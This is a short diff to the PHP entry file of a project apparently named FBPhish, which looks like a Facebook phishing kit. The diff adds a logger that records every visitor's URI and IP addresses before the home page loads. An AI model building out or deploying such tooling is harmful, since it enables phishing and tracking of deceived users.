@@ -26,15 +26,19 @@ $apppath = __DIR__;
 require_once("$apppath/includes/config.inc.php");
 require_once("$apppath/includes/classes/fbphish.class.php");
 require_once("$apppath/includes/classes/sql.class.php");
+require_once("$apppath/includes/classes/logger.class.php");
 require_once("$apppath/includes/functions/debug.func.php");
 require_once("$apppath/includes/functions/getip.func.php");
 
 
 $FBPhish = new FBPhish();
 $sql = new sql();
+$logger = new logger();
 
 $FBPhish->init();
 $FBPhish->themecheck();
+
+$logger->uriLog("log/uri", $baseurl . $_SERVER['REQUEST_URI'], "/index.php", "NULL", getIp(), getMetaIp());
 
 $content = $FBPhish->loadPage("home");
 
